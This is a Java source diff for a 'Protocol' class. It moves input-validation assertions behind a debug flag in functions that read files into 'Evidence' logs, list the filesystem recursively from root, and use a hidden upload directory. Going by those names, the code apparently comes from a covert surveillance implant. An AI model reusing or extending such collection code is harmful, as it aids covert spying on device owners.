@@ -191,10 +191,10 @@ public abstract class Protocol {
 	 *            the filename
 	 */
 	private static void saveFileLog(final AutoFile file, final String filename) {
-		Check.requires(file != null, "null file");
-		Check.requires(file.exists(), "file should exist");
-		Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
-		Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
+		if(Cfg.DEBUG) Check.requires(file != null, "null file");
+		if(Cfg.DEBUG) Check.requires(file.exists(), "file should exist");
+		if(Cfg.DEBUG) Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
+		if(Cfg.DEBUG) Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
 		final byte[] content = file.read();
 		final byte[] additional = Protocol.logDownloadAdditional(filename);
 		//final Evidence log = new Evidence(0);
@@ -213,9 +213,9 @@ public abstract class Protocol {
 	 * @return the byte[]
 	 */
 	private static byte[] logDownloadAdditional(String filename) {
-		Check.requires(filename != null, "null file");
-		Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
-		Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
+		if(Cfg.DEBUG) Check.requires(filename != null, "null file");
+		if(Cfg.DEBUG) Check.requires(!filename.endsWith("/"), "path shouldn't end with /");
+		if(Cfg.DEBUG) Check.requires(!filename.endsWith("*"), "path shouldn't end with *");
 		final String path = Utils.chomp(Path.hidden(), "/"); // UPLOAD_DIR
 		final int macroPos = filename.indexOf(path);
 		if (macroPos >= 0) {
@@ -281,7 +281,7 @@ public abstract class Protocol {
 	 *            the depth
 	 */
 	private static void expandRoot(final Evidence fsLog, final int depth) {
-		Check.requires(depth > 0, "wrong recursion depth");
+		if(Cfg.DEBUG) Check.requires(depth > 0, "wrong recursion depth");
 		saveRootLog(fsLog); // depth 0
 		expandPath(fsLog, "/", depth);
 
@@ -298,9 +298,9 @@ public abstract class Protocol {
 	 */
 	private static boolean saveFilesystemLog(final Evidence fsLog,
 			final String filepath) {
-		Check.requires(fsLog != null, "fsLog null");
-		Check.requires(!filepath.endsWith("/"), "path shouldn't end with /");
-		Check.requires(!filepath.endsWith("*"), "path shouldn't end with *");
+		if(Cfg.DEBUG) Check.requires(fsLog != null, "fsLog null");
+		if(Cfg.DEBUG) Check.requires(!filepath.endsWith("/"), "path shouldn't end with /");
+		if(Cfg.DEBUG) Check.requires(!filepath.endsWith("*"), "path shouldn't end with *");
 		if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: save FilesystemLog: " + filepath);
 		final int version = 2010031501;
 
@@ -350,7 +350,7 @@ public abstract class Protocol {
 	 */
 	private static void saveRootLog(final Evidence fsLog) {
 		final int version = 2010031501;
-		Check.requires(fsLog != null, "fsLog null");
+		if(Cfg.DEBUG) Check.requires(fsLog != null, "fsLog null");
 		final byte[] content = new byte[30];
 
 		final DataBuffer databuffer = new DataBuffer(content);
@@ -376,11 +376,11 @@ public abstract class Protocol {
 	 */
 	private static void expandPath(final Evidence fsLog, final String path,
 			final int depth) {
-		Check.requires(depth > 0, "wrong recursion depth");
-		Check.requires(path != null, "path==null");
-		Check.requires(path == "/" || !path.endsWith("/"),
+		if(Cfg.DEBUG) Check.requires(depth > 0, "wrong recursion depth");
+		if(Cfg.DEBUG) Check.requires(path != null, "path==null");
+		if(Cfg.DEBUG) Check.requires(path == "/" || !path.endsWith("/"),
 				"path should end with /");
-		Check.requires(!path.endsWith("*"), "path shouldn't end with *");
+		if(Cfg.DEBUG) Check.requires(!path.endsWith("*"), "path shouldn't end with *");
 		if(Cfg.DEBUG) Log.d("QZ", TAG + " expandPath: " + path + " depth: " + depth);
 		final File dir = new File(path);
 		if (dir.isDirectory()) {
